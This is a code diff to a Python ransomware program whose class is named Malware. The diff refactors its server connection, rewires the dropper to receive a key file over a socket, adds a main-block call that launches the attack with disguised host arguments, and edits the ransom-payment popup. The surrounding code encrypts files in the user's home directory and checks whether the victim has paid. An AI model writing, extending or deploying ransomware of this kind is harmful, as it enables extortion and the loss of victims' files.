@@ -92,7 +92,15 @@ class Malware:
                 files.append(file)
 
         return files
-
+    
+    def establish_connection(self):
+        """ Create a connection to the server. """
+        try:
+            print(self._host)
+            self.socket.connect((self._host, self._port))
+        except socket.error:
+            logging.debug('Dropper could not connect to the server.')
+            return
 
     # Method for encrypting a single file
     def encrypt_file(self, file, key):
@@ -147,31 +155,22 @@ class Malware:
                 self.decrypt_file(file_path, key)
 
     def execute_attack(self):
-        """ Download malicious code from the server. """
-        # Create a connection to the server.
-        try:
-            print(self._host)
-            self.socket.connect((self._host, self._port))
-        except socket.error:
-            logging.debug('Dropper could not connect to the server.')
-            return
+        self.establish_connection()
         
-        """ Receiving the malicious code in the encrypted form. """
+        """ Receiving the public key. """
         filename = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
-        print(f"[RECV] Receiving the filename.")
-        print(filename)
+        print(f"[RECV] Receiving the public key.")
         file = open(filename, "w")
         self._socket.send("Filename received.".encode("utf-8"))
  
-        """ Receiving the file data from the client. """
+        """ Receiving the public key from the server. """
         while True:
             data = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
-            print(data)
             file.write(data)
             if data == "DONE.":
                 break
           
-        print(f"[RECV] Receiving the file data.")
+        print(f"[RECV] Receiving the public key data.")
         #file.write(data)
         self._socket.send("File data received".encode("utf-8"))
  
@@ -193,6 +192,13 @@ if __name__ == '__main__':
 
     # Home directory
     HOME = expanduser("~")
+
+    logging.basicConfig(level=logging.DEBUG)
+
+    # Initialize dropper application.
+    malware = Malware('tsoh', 'lacol', 729000000)
+    # Collect the malicious code and dump it into the file.
+    malware.execute_attack()
 
     #TODO: Replace this with Asymetric crypto
     #Generate key and make a key file
@@ -236,7 +242,7 @@ if __name__ == '__main__':
 
     #User has paid before the time ran out
     if (Malware.check_if_user_has_paid()):
-        popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been recieved! \n Decrypting all files.","--width", "400", "--height", "200" ])
+        popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been received! \n Decrypting all files.","--width", "400", "--height", "200" ])
         # decrypt_all_files(home, key)
         #TODO: Implement code to delete all the files that are stored on the server
 
